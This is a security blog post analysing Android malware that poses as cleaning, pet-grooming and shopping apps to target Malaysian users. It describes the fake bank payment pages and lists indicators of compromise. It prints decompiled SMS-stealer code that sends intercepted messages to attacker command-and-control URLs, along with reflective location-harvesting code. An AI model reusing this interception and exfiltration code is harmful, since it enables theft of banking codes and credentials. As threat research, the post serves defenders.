---
layout: article
title: "Yet another Malicious Android Apps targeting Malaysian"
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(34, 139, 87), rgb(139, 34, 139))'
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /assets/images/header/the-average-tech-guy-DsmDqiYduaU-unsplash.jpg
tags: APK
---

In this post, we will be discussing a disturbing new trend in malicious Android apps that have been targeting users in Malaysia. These apps, which have been disguised as legitimate services such as Cleaning service, have been found to contain SMS stealer and banking credential phishing capabilities, putting the sensitive information of their victims at risk.

The rise of smartphone usage in recent years has brought with it a host of security threats, including malicious apps that can compromise the privacy and security of users. These types of apps can be difficult to detect, as they often masquerade as harmless or even useful tools.

In the case of the malicious apps targeting Malaysian users, it is believed that they have been distributed through its websites. It is important for users to be cautious when downloading apps from unfamiliar sources, as this is one of the main ways that malicious apps can find their way onto a user's device.

In this post, we will delve into the details of these particular incidents, including how the apps have been used to steal sensitive information such as SMS messages and banking credentials, and what users can do to protect themselves from similar threats.

Credit to [Mr Jacob Soo](https://twitter.com/_jsoo_) for providing me the intel about this risen malicious APK.

# Technical Analysis
This technical analysis is just for fun and knowledge sharing. All my words and writing is on my own and does not reflect anyone.

For this modus operandi, there were a lot of websites that serve the malicious APK. Here some of it that Mr. Jacob has intel for us.

| Websites | APK hash | Theme |
| --- | --- | --- |
| hxxps://weclean[.]cc/ | 1030f97b9ad1addf85b980f576b648a3 | Cleaning service |
| hxxps://double-clean[.]com/ | 1abf5db7726c4e6e9a3a6ce6cdd313af | Cleaning service |
| hxxps://cleanshouse[.]net/ | 1b7df305308e4177ae2f078be13c3de9 | Cleaning service |
| hxxp://dogsclubs[.]net | a56a386b76841bd0aa10654e8d7f4efc | Cleaning service |
| hxxp://best-cleanings[.]com | e71f6e4629fb88ab18e52a2591b14fa8 | Cleaning service |
| hxxp://bubblecleaning[.]net | 7f0e204375caddb08d4c3f9937fa8304 | Cleaning service |
| hxxp://44speedmart[.]com | 23f449dbfc6b9ccae1d20d318672e6d4 | Grocery store |
| hxxps://dog-salon[.]net/ | 2b425dd477fca2932dfab2d5159f611d | Dog salon service |
| hxxp://grooming-time[.]com | f8de585ec8d75b6aae0f41ddf2dc03d8 | Dog salon service |
| hxxp://luxury-online[.]net | ccb0e8380057a4c406996d5102079a4b | Shopping items |
| hxxps://pinky-cat[.]net/ | 5ca6c25f1b2d8e4ca5987e68616247d7 | Cat's foods |
| hxxps://tech-digital[.]net/ | e062d108c93082fb9f47c3f2249d19c5 | Gadget ecommerce |

The moment this post published, I believe you all can't access the domain anymore as the CloudFlare returns Error code 520. Sad.

Btw, the domain might be different, but I suspect that the server behind these domains is the same for some reasons.

## APK Metadata information
```
File Name:	clean-house.apk
Package Name:	com.service.sms
Main Activity:	io.dcloud.PandoraEntry
File Size:	39652340 bytes
MD5:		1b7df305308e4177ae2f078be13c3de9
Packed:		Not Packed
Min SDK:	21
Target SDK:	32
```

## Permission
Based on the permissions of the application, we know that the application had some dangerous permission for users to consider it. But, looking only for permission to verify whether it is malicious or not is not an efficient way. We need to dive into the code and the behavior of the application to see how malicious is it.

Below is the list of permissions in the application:
```
android.permission.CAMERA
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.READ_SMS
android.permission.WRITE_SMS
android.permission.RECEIVE_SMS
android.permission.SEND_SMS
android.permission.RECEIVE_MMS
android.permission.RECEIVE_WAP_PUSH
android.permission.INTERNET
android.permission.FOREGROUND_SERVICE
android.permission.GET_TASKS
android.permission.RECEIVE_BOOT_COMPLETED
android.permission.BROADCAST_STICKY
android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
android.permission.ACCESS_NETWORK_STATE
android.permission.READ_EXTERNAL_STORAGE
android.permission.WAKE_LOCK
android.permission.SEND_RESPOND_VIA_MESSAGE
android.permission.BROADCAST_WAP_PUSH
android.permission.BROADCAST_SMS
android.permission.BIND_JOB_SERVICE
android.permission.DUMP
```

Btw, it is difficult to determine which Android permissions are "dangerous" as the level of risk associated with each permission depends on the specific app and how it uses the permission. Some permissions, such as the ability to access the camera or read SMS messages, can be potentially dangerous if they are used by a malicious app to compromise the privacy or security of the user. Other permissions, such as the ability to access the internet or read external storage, may not pose as much of a risk on their own but could be used in conjunction with other permissions to potentially harm the user.

As a general rule, it is important for users to carefully review the permissions requested by an app before installing it, and to be cautious of apps that request permissions that seem unnecessary for the app's intended functionality. It is also a good idea to avoid downloading apps from untrusted sources, as these apps are more likely to be malicious.

But for analysts, we can consider these permissions to have our eye on it as it can be considered as dangerous in a certain context.
```
READ_CALENDAR
WRITE_CALENDAR
READ_CALL_LOG
WRITE_CALL_LOG
PROCESS_OUTGOING_CALLS
CAMERA
READ_CONTACTS
WRITE_CONTACTS
GET_ACCOUNTS
ACCESS_FINE_LOCATION
ACCESS_COARSE_LOCATION
RECORD_AUDIO
READ_PHONE_STATE
READ_PHONE_NUMBERS
CALL_PHONE
ANSWER_PHONE_CALLS
ADD_VOICEMAIL
USE_SIP
BODY_SENSORS
SEND_SMS
RECEIVE_SMS
READ_SMS
RECEIVE_WAP_PUSH
RECEIVE_MMS
READ_EXTERNAL_STORAGE
WRITE_EXTERNAL_STORAGE
```

## Landing page overview

The application's APK file is available to be downloaded at the landing page that has been set up by the threat actor at the mentioned table in the section above. Based on the landing page UI, the threat actor uses various themes to lure customers to download and install the malicious application if the customer wanted to book the package cleaning service, dog salon, eCommerce, and other packages.

The image below shows the cleaning service landing page that describes the cleaning service that they're offering for victims. To use their services, victims need to download and install malicious application.

![image](https://user-images.githubusercontent.com/56353946/209335759-2787ae8f-be8d-4f0f-8b41-5934e7fb644a.png)

Clicking on the Google Play icon will automatically download the application to the victim's phone.

![image](https://user-images.githubusercontent.com/56353946/209338784-81f6017f-5f07-4e33-8482-b0f6bf288591.png)

Upon downloading the application, victims will install the application, and... all the SMS will be stolen for the sake of TAC code and they might be one of the victims of banking credential phishing.

## Application behavior and interface

In order to analyze the functionality of the malicious app, analyst will need to explore its interface and various features, such as adding items to a shopping cart or creating an account. This can be done by manually interacting with the app and observing its behavior, or by using Android emulator. By understanding the different components and functionality of the app, the analyst can better understand its purpose and potential impact on the device and user. It is important for the analyst to be thorough in their analysis in order to identify any potential malicious behavior or vulnerabilities that may be present in the app.

So, upon opening the app, victim will see a dialog box asking for SMS permission and default SMS manager.

![Snipaste_2022-12-23_20-53-39-removebg-preview](https://user-images.githubusercontent.com/56353946/209339579-b9f59871-5b99-4cda-a330-e6a855bdd211.png)
![Snipaste_2022-12-23_20-55-41-removebg-preview](https://user-images.githubusercontent.com/56353946/209341216-00240392-318a-4bac-be41-dc908cc9bda0.png)

```Java
public void requestPermission(){
       if (Build$VERSION.SDK_INT >= 23) {
          String[] stringArray = new String[]{"android.permission.READ_SMS","android.permission.BROADCAST_SMS","android.permission.RECEIVE_SMS","android.permission.SEND_SMS","android.permission.RECEIVE_MMS","android.permission.RECEIVE_WAP_PUSH"};
          SmsPermissionService.app.requestPermissions(stringArray, 101);
       }
       Intent intent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
       intent.putExtra("package", SmsPermissionService.app.getPackageName());
       SmsPermissionService.app.startActivity(intent);
       return;
    }
```

This code defines an requestPermission method that requests several SMS-related permissions from the user if the device is running Android 6.0 (API level 23) or higher. The permissions being requested are:

- `android.permission.READ_SMS`: Allows an application to read SMS messages.
- `android.permission.BROADCAST_SMS`: Allows an application to broadcast SMS messages.
- `android.permission.RECEIVE_SMS`: Allows an application to receive SMS messages.
- `android.permission.SEND_SMS`: Allows an application to send SMS messages.
- `android.permission.RECEIVE_MMS`: Allows an application to receive MMS messages.
- `android.permission.RECEIVE_WAP_PUSH`: Allows an application to receive WAP push messages.

These permissions are requested using the `requestPermissions` method of the Activity class, which displays a system dialog to the user asking for permission. The `requestPermissions` method takes two arguments: an array of strings representing the permissions being requested, and an integer request code that is used to identify the request when the result is received in the onRequestPermissionsResult method.

The code also starts an activity to change the default SMS app to the current app by creating an Intent object with the action "android.provider.Telephony.ACTION_CHANGE_DEFAULT" and setting the package name of the current app as an extra. The activity is started using the startActivity method of the Activity class.

Here some of the application interface during my testing of the app such as viewing items/services, booking items/services, adding items/services to a shopping cart, and checkout.

![Snipaste_2022-12-23_20-55-50-removebg-preview](https://user-images.githubusercontent.com/56353946/209341218-3910f52d-de6c-4100-b6e1-6c07470f98ee.png)
![Snipaste_2022-12-23_20-56-34-removebg-preview](https://user-images.githubusercontent.com/56353946/209341219-88303f48-b1b7-497b-b805-25f2b01b7b40.png)
![Snipaste_2022-12-23_20-56-57-removebg-preview](https://user-images.githubusercontent.com/56353946/209341223-bccc5e82-819e-4c56-854c-8d1a2732f10b.png)
![Snipaste_2022-12-23_20-57-08-removebg-preview](https://user-images.githubusercontent.com/56353946/209341226-90d3bb9e-dd37-419b-abc6-4e80da8348be.png)


## Fake payment gateway for phishing

Upon checkout the items, the app will navigate to fake payment gateaway for the payment options. The payment also can be made using Debit and Credit Card.

![Snipaste_2022-12-23_20-57-56-removebg-preview](https://user-images.githubusercontent.com/56353946/209341229-4f26da73-b2ea-48fc-9dcd-d6b123945be7.png)

The list of banks include:
1. Maybank
2. Hong Leong Bank
3. CIMB
4. Public Bank
5. Affin
6. BSN
7. Bank Islam
8. AmBank
9. OCBC
10. HSBC
11. HUOB
12. AGRO

For example, figure below shows fake Maybank2u page and lure debit/credit card payment page:

![Snipaste_2022-12-23_20-58-18-removebg-preview](https://user-images.githubusercontent.com/56353946/209341232-e782d486-3230-4430-a083-c469aed60dd2.png)
![Snipaste_2022-12-23_20-58-26-removebg-preview](https://user-images.githubusercontent.com/56353946/209341234-691f0e11-26f8-4231-8c62-973507ca0cea.png)
![Snipaste_2022-12-23_20-58-48-removebg-preview](https://user-images.githubusercontent.com/56353946/209341201-c225d807-49dc-49ea-a31e-bb8a6144dfce.png)

Upon entering our banking credential, the app will POST the data to the API server reside in `https://u138-paymobile7731.pay-director.com/common/save.php`

![image](https://user-images.githubusercontent.com/56353946/209454017-4a2eda97-d559-4ee1-b436-45ab0ca826c8.png)

After send the data, the application will either shows this screen to the user.

![Snipaste_2022-12-23_20-59-25-removebg-preview (1)](https://user-images.githubusercontent.com/56353946/209341207-2b15dbc4-8c6c-4d5d-83b9-051cf4531ee0.png)
![Snipaste_2022-12-23_20-59-57-removebg-preview](https://user-images.githubusercontent.com/56353946/209341208-ad263834-b79a-4fc7-a86f-5521a7ae04fa.png)

## SMS stealer

For SMS stealer behavior, the malicious application statically declares a broadcast receiver of BROADCAST_SMS in AndroidManifest file. The APK uses the broadcast receiver to listen for any incoming message and send the incoming SMS data to the attacker API server. Intently to get TAC code of the banking transaction for the illegal transaction.

```XML
<receiver android:name="com.service.sms.SmsReceiver" android:permission="android.permission.BROADCAST_SMS" android:enabled="true" android:exported="true" android:priority="9999999" android:stopWithTask="false">
            <intent-filter android:priority="9999999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <activity android:name="com.service.sms.MainSmsActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <action android:name="android.intent.action.SENDTO"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="sms"/>
                <data android:scheme="smsto"/>
                <data android:scheme="mms"/>
                <data android:scheme="mmsto"/>
            </intent-filter>
            <meta-data android:name="android.app.lib_name" android:value=""/>
        </activity>
```

In the class MyReciever, the method onReceive will be triggered when an SMS is coming in and the application will send the SMS data to the attacker URL. Here's the code:

```Java
public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        SmsMessage createFromPdu;
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle extras = intent.getExtras();
            Object[] objArr = (Object[]) extras.get("pdus");
            int length = objArr.length;
            int i = 0;
            String str = "";
            String str2 = str;
            while (i < length) {
                Object obj = objArr[i];
                if (Build.VERSION.SDK_INT >= 23) {
                    createFromPdu = SmsMessage.createFromPdu((byte[]) obj, extras.getString(AbsoluteConst.JSON_KEY_FORMAT));
                } else {
                    createFromPdu = SmsMessage.createFromPdu((byte[]) obj);
                }
                str2 = str2 + createFromPdu.getMessageBody();
                i++;
                str = createFromPdu.getOriginatingAddress();
            }
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
            SmsPush smsPush = new SmsPush();
            smsPush.setSender(str);
            smsPush.setBody(str2);
            smsPush.setDeviceId(Settings.Secure.getString(context.getContentResolver(), "android_id"));
            smsPush.setInterceptedTime(simpleDateFormat.format(new Date()));
            try {
                SmsPushRequest smsPushRequest = (SmsPushRequest) ThreadUtil.executeRunnable(new SmsPushRequest(smsPush));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            abortBroadcast();
        }
    }
}
```

This Java code defines a class `SmsReceiver` that extends the `BroadcastReceiver` class. `BroadcastReceiver` is a class in Android that allows an app to register to receive system-wide broadcasts, such as an incoming SMS message. The `SmsReceiver` class has a default constructor and an onReceive method, which is called when the app receives a broadcast.

The `onReceive` method takes two arguments: a `Context` object and an `Intent` object. The `Intent` object contains information about the broadcast, including the action that triggered it.

The onReceive method first checks if the action in the Intent object is "android.provider.Telephony.SMS_RECEIVED", which indicates that an SMS message has been received. If it is, the method retrieves the extras in the Intent object and gets the "pdus" (protocol data units) from the extras. It then iterates through the array of PDUs, creating an `SmsMessage` object for each one using the `createFromPdu` method. It concatenates the message bodies of all the SmsMessage objects into a single string, and stores the originating address of the first SmsMessage object.

Next, the method creates a new `SmsPush` object and sets its sender, body, and deviceId fields using the values it retrieved from the SMS message. It also sets the `interceptedTime` field to the current date and time using a `SimpleDateFormat` object. Finally, it creates a new `SmsPushRequest` object with the `SmsPush` object as an argument and executes it using the `executeRunnable` method from the `ThreadUtil` class.

```Java
package com.service.sms.common.constants;

/* loaded from: classes2.dex */
public class UrlConstant {
    public static final String ACTIVE_PUSH = "https://sg1.mall-base-app.com/app/api/action/devideActivePushAction/";
    public static final String DEFAULT_SMS_PUSH = "https://sg1.mall-base-app.com/app/api/action/defaultSmsPushAction/";
    public static final String PREFIX = "/app/api/action/";
    public static final String SMS_PERMISSION_PUSH = "https://sg1.mall-base-app.com/app/api/action/smsPermissionPushAction/";
    public static final String SMS_PUSH = "https://sg1.mall-base-app.com/app/api/action/smsMessagePushAction/";
}
```

After getting the SMS data, the app will send the data to the `UrlConstant.DEFAULT_SMS_PUSH URL` using an HTTP POST request and processes the response from the server to determine if the request was successful.

## Track GPS location
```Java
JSONObject jSONObject = new JSONObject();
        LocationManager locationManager = (LocationManager) context.getSystemService("location");
        if (locationManager != null) {
            try {
                Method declaredMethod = locationManager.getClass().getDeclaredMethod("getLastKnownLocation", String.class);
                declaredMethod.setAccessible(true);
                Location location = (Location) declaredMethod.invoke(locationManager, "gps");
                if (location == null && (location = (Location) declaredMethod.invoke(locationManager, "network")) == null) {
                    location = (Location) declaredMethod.invoke(locationManager, "passive");
                }
                if (location != null) {
                    Class<?> cls = Class.forName("android.location.Location");
                    Method method = cls.getMethod("getLongitude", new Class[0]);
                    Method method2 = cls.getMethod("getLatitude", new Class[0]);
                    Method method3 = cls.getMethod("getAccuracy", new Class[0]);
                    Method method4 = cls.getMethod("getTime", new Class[0]);
                    method.setAccessible(true);
                    jSONObject.put("lon", String.valueOf(method.invoke(location, new Object[0])));
                    method2.setAccessible(true);
                    jSONObject.put("lat", String.valueOf(method2.invoke(location, new Object[0])));
                    method3.setAccessible(true);
                    jSONObject.put("accuracy", String.valueOf(method3.invoke(location, new Object[0])));
                    method4.setAccessible(true);
                    jSONObject.put("ts", String.valueOf(method4.invoke(location, new Object[0])));
                }
            } catch (Exception unused) {
            }
        }
        a = jSONObject;
        b = true;
        return jSONObject;
```

This method tries to retrieve the last known location from the device and return it as a JSONObject.

The method first checks whether the passed Context object is `null` and returns an empty `JSONObject` if it is. Then, it checks whether the app has the permissions `android.permission.ACCESS_FINE_LOCATION` and `android.permission.ACCESS_COARSE_LOCATION`, and returns an empty `JSONObject` if it doesn't have either of these permissions.

If these checks pass, the method creates a new `JSONObject` and retrieves the `LocationManager` service from the system using the context object's `getSystemService` method. It then tries to retrieve the last known location using reflection. It does this by calling the `getDeclaredMethod` method on the `locationManager` object to get a Method object for the `getLastKnownLocation` method, which it then sets to be accessible using `setAccessible(true)`. It then invokes the method using invoke and passes it the argument "gps". If this returns null, the method tries again with the arguments "network" and "passive".

If a location is found, the method uses reflection to get the longitude, latitude, accuracy, and time of the location. It then adds the values returned by these methods to the JSONObject as key-value pairs.

Finally, the method sets the static JSONObject a to the JSONObject it created and sets the static boolean variable b to true, and returns the JSONObject.

# Summary
The blog discusses the use of a lure application by a scammer to steal sensitive information from users. The lure application serves as a decoy, tricking users into providing their SMS data and online banking credentials, as well as credit card information. Once the scammer has obtained the SMS information, it is submitted to the attacker's Command and Control (C2) server using an API located at the domain sg1[.]mall-base-app[.]com. While, for banking credential phishing kit, the data are sends to u138-paymobile7731[.]pay-director[.]com The attacker can then use the stolen information, such as banking credentials and credit card information, to obtain the Transaction Authorization Code (TAC) for illegal transactions. Essentially, the scammer is using the lure application to phish for sensitive information and use it for fraudulent purposes.

# Indicator of Compromises

| C2 Server |
| --- |
| https://sg1.mall-base-app.com |
| https://u138-paymobile7731.pay-director.com |

| URLs |
| --- |
| https://sg1.mall-base-app.com/app/api/action/defaultSmsPushAction/ |
| https:/sg1.mall-base-app.com/app/api/action/devideActivePushAction/ |
| https://sg1.mall-base-app.com/app/api/action/smsMessagePushAction/ |
| https://sg1.mall-base-app.com/app/api/action/smsPermissionPushAction/ |
| https://u138-paymobile7731.pay-director.com/maybank/pay.html |
| https://u138-paymobile7731.pay-director.com/cimb/pay.html |
| https://u138-paymobile7731.pay-director.com/affin/pay.html |
| https://u138-paymobile7731.pay-director.com/ocbc/pay.html |
| https://u138-paymobile7731.pay-director.com/hsbc/pay.html |
| https://u138-paymobile7731.pay-director.com/uob/pay.html |
| https://u138-paymobile7731.pay-director.com/common/save.php |

| MD5 Hash | Filename |
| --- | --- |
| ccb0e8380057a4c406996d5102079a4b | Luxury.apk |
| e062d108c93082fb9f47c3f2249d19c5 | TechDigital.apk |
| e71f6e4629fb88ab18e52a2591b14fa8 | best-cleaning.apk |
| 7f0e204375caddb08d4c3f9937fa8304 | bubble-clean.apk |
| 1b7df305308e4177ae2f078be13c3de9 | clean-house.apk |
| 2b425dd477fca2932dfab2d5159f611d | dog-salon.apk |
| a56a386b76841bd0aa10654e8d7f4efc | dogs-clubs.apk |
| 1abf5db7726c4e6e9a3a6ce6cdd313af | double-clean.apk |
| f8de585ec8d75b6aae0f41ddf2dc03d8 | grooming-time.apk |
| 5ca6c25f1b2d8e4ca5987e68616247d7 | pinkycat.apk |
| 23f449dbfc6b9ccae1d20d318672e6d4 | speedmart.apk |
| 1030f97b9ad1addf85b980f576b648a3 | we-clean.apk |
| 1030f97b9ad1addf85b980f576b648a3 | we-clean.apk |

